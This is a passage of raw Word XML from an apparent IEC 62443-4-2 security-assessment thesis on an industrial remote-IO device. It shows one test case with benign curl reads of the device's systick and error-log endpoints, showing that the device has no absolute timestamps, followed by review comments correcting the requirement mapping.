        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ003-04 — Time-Attribution Failure of Collected Evidence (G-2 proof)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F1442D3" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00271C74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752"/>
      </w:tblGrid>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00271C74" w14:paraId="1B5B5E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5496E7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2E1EAC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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00271C74" w14:paraId="29C52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9745F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 xml:space="preserve">Test Case </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74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227FE" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74">
              <w:lastRenderedPageBreak/>
              <w:t>TC-RQ003-04</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00271C74" w14:paraId="32387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B7867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6CD8D" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74">
              <w:t>RQ-003 → CR 2.11 / CR 3.9 → Asset I</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00CB35D8" w14:paraId="6F868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05A73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ACC90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>Repudiation (loss of temporal attribution)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00CB35D8" w14:paraId="569C3E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43AB7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 xml:space="preserve">SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74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D3F26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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>SVV-3</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (Vulnerability Testing — log/time review)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00CB35D8" w14:paraId="76C7BB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2673FE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CC113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Demonstrate that even the evidence the device </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>does</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> record cannot be placed in absolute time: the device exposes only an </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>uptime/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>systick</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> reference that </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>resets on cold start</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">, with no </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>synchronised</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> real-time clock — so interventions separated by a power cycle cannot be temporally ordered or dated.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00CB35D8" w14:paraId="701C8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7205A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 xml:space="preserve">Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74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11481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lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">1. Generate a </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>loggable</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> event; read </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>systick</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">/uptime and the log entry. 2. Cold-restart. 3. Generate a second event; read </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>systick</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>/uptime again. 4. Compare: show the time base reset and that no absolute timestamp is attached to either entry.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00CB35D8" w14:paraId="27621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5B7B5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56575" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Gap-characterisation test.</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Expected:</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> uptime/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>systick</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> resets to ~0 after cold start; no absolute date/time is present in any record → </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>CR 2.11 unmet</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">, evidence is not time-referenceable → </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>FAIL against RQ-003</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7919C24D" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74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271C74" w:rsidRPr="00271C74" w14:paraId="58FD7A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3FF99C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57B667" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00271C74" w14:paraId="79C86D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EFF9F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Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74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11D93" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74">
              <w:t>TC-RQ003-04</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00271C74" w14:paraId="5AE82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4D840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8C486" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve">DUT 192.168.0.2; Pi </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:t>mgmt</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve"> eth1 = 192.168.50.10</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00271C74" w14:paraId="1EA84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8B04B" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74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FDE1A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t>curl</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:t>to</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve"> IoT-Core (/systemtime/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:t>systick</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:t>error</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve"> log); NIST SP 800-115 §3.2 log-review </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:t>method</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00271C74" w14:paraId="22B7C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B18F5" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Commands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9301D" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7EB9B68C" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00A16302" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t># TC-RQ003-04 Demonstrate absence of absolute time / reset on cold start</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="359D04E8" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00A16302" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">curl -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId74" w:history="1">
        <w:r w:rsidRPr="00A16302">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>http://192.168.0.2/systemtime/systick</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC04_tick_1.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63D20F6C" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00A16302" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId75" w:history="1">
        <w:r w:rsidRPr="00A16302">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="pt-BR"/>
          </w:rPr>
          <w:t>http://192.168.0.2/devicestatus/errorlog/loglist</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC04_log_1.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CA68598" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00A16302" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"># --- trigger a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>loggable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> event (e.g. brief SCPU/comms interruption), then COLD RESTART ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B5FC626" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00A16302" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">curl -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId76" w:history="1">
        <w:r w:rsidRPr="00A16302">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>http://192.168.0.2/systemtime/systick</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC04_tick_2.json # expect reset toward 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="544186E8" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00A16302" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId77" w:history="1">
        <w:r w:rsidRPr="00A16302">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="pt-BR"/>
          </w:rPr>
          <w:t>http://192.168.0.2/devicestatus/errorlog/loglist</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC04_log_2.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70E149B8" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00A16302" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Expected</w:t>
      </w:r>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | tick_2 &lt;&lt; tick_1 (counter reset); log entries carry only relative uptime, no absolute timestamp (SRIO-15218/15398). | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Result</w:t>
      </w:r>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | ☐ Time base resets, no absolute timestamp (G-2 confirmed) | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Evidence</w:t>
      </w:r>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | TC04_tick_1/2.json, TC04_log_1/2.json, log-review note per NIST SP 800-115 §3.2 | </w:t>
      </w:r>
      <w:hyperlink r:id="rId78" w:history="1">
        <w:r w:rsidRPr="00A16302">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00A16302">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00A16302">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0DD61713" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00000000" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r>
        <w:pict w14:anchorId="737D4C76">
          <v:rect id="_x0000_i1044" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="693FF7DC" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00A16302" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Summary of My Corrections to Your Input</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5614A975" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Mapping under-scoped:</w:t>
      </w:r>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> an evidence requirement needs the full audit family → add </w:t>
      </w:r>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>CR 2.9, CR 2.10, CR 2.11 (decisive), CR 3.9, CR 6.1</w:t>
      </w:r>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, plus </w:t>
      </w:r>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EDR 2.13</w:t>
      </w:r>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> for the debug/test port. Note </w:t>
      </w:r>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>CR 6.1 is the one sub-capability that is met</w:t>
      </w:r>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (log is IoT-readable). </w:t>
      </w:r>
      <w:hyperlink r:id="rId79" w:history="1">
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId80" w:history="1">
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve">[IEC62443_4_2_source | </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Txt</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="71B5D4FA" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>You understated existing controls:</w:t>
      </w:r>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the device </w:t>
      </w:r>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>does</w:t>
      </w:r>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> collect partial evidence — </w:t>
      </w:r>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>I&amp;M0 REVISION_COUNTER</w:t>
      </w:r>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>I&amp;M4 signature</w:t>
      </w:r>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, and the </w:t>
      </w:r>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>COM Error Log</w:t>
      </w:r>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. A rigorous thesis must name these and then show why each fails (no identity, no time, cold-start cleared). </w:t>
      </w:r>
      <w:hyperlink r:id="rId81" w:history="1">
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
